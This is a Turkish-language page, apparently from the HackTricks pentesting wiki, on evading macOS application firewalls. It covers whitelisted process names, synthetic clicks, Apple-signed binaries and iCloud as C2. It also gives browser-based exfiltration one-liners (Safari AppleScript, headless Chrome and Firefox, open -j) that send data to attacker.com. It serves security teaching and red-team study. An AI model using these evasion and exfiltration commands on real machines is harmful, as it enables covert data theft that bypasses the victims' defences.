# macOS Güvenlik Duvarlarını Aşma

{{#include ../../banners/hacktricks-training.md}}

## Bulunan teknikler

Aşağıdaki teknikler bazı macOS güvenlik duvarı uygulamalarında çalışır durumda bulundu.

### Beyaz liste isimlerini kötüye kullanma

- Örneğin, kötü amaçlı yazılımı **`launchd`** gibi iyi bilinen macOS süreçlerinin isimleriyle çağırmak.

### Sentetik Tıklama

- Eğer güvenlik duvarı kullanıcıdan izin istiyorsa, kötü amaçlı yazılımın **izin ver** butonuna tıklamasını sağlamak.

### **Apple imzalı ikililer kullanma**

- **`curl`** gibi, ama ayrıca **`whois`** gibi diğerleri de.

### İyi bilinen apple alan adları

Güvenlik duvarı, **`apple.com`** veya **`icloud.com`** gibi iyi bilinen apple alan adlarına bağlantılara izin veriyor olabilir. Ve iCloud, bir C2 olarak kullanılabilir.

### Genel Aşma

Güvenlik duvarlarını aşmayı denemek için bazı fikirler.

### İzin verilen trafiği kontrol etme

İzin verilen trafiği bilmek, potansiyel olarak beyaz listeye alınmış alan adlarını veya hangi uygulamaların onlara erişmesine izin verildiğini belirlemenize yardımcı olacaktır.
```bash
lsof -i TCP -sTCP:ESTABLISHED
```
### DNS'i Kötüye Kullanma

DNS çözümlemeleri, muhtemelen DNS sunucularıyla iletişim kurmasına izin verilecek olan **`mdnsreponder`** imzalı uygulama aracılığıyla gerçekleştirilir.

<figure><img src="../../images/image (468).png" alt="https://www.youtube.com/watch?v=UlT5KFTMn2k"><figcaption></figcaption></figure>

### Tarayıcı Uygulamaları Aracılığıyla

- **oascript**
```applescript
tell application "Safari"
run
tell application "Finder" to set visible of process "Safari" to false
make new document
set the URL of document 1 to "https://attacker.com?data=data%20to%20exfil
end tell
```
- Google Chrome
```bash
"Google Chrome" --crash-dumps-dir=/tmp --headless "https://attacker.com?data=data%20to%20exfil"
```
- Firefox
```bash
firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
```
- Safari
```bash
open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
```
### Süreç enjeksiyonları aracılığıyla

Herhangi bir sunucuya bağlanmasına izin verilen bir **süreç içine kod enjekte edebilirseniz**, güvenlik duvarı korumalarını aşabilirsiniz:

{{#ref}}
macos-proces-abuse/
{{#endref}}

## Referanslar

- [https://www.youtube.com/watch?v=UlT5KFTMn2k](https://www.youtube.com/watch?v=UlT5KFTMn2k)

{{#include ../../banners/hacktricks-training.md}}
